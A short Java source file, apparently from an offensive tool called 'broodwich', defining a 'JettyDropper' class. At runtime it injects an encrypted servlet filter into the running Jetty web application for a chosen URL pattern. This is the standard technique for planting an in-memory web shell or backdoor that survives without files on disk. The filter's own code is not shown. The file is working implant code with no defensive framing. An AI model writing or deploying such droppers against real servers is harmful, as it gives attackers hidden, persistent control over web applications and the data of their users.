package party.itistimeto.broodwich.droppers;

import org.eclipse.jetty.servlet.FilterHolder;
import org.eclipse.jetty.webapp.WebAppContext;

import javax.servlet.DispatcherType;
import java.util.EnumSet;

public class JettyDropper {
    public static void taste(String pattern, String encKey) {
        FilterHolder filter = new FilterHolder(new BroodwichFilter(encKey));
        WebAppContext.getCurrentWebAppContext().addFilter(filter, pattern, EnumSet.of(DispatcherType.REQUEST));
    }
}
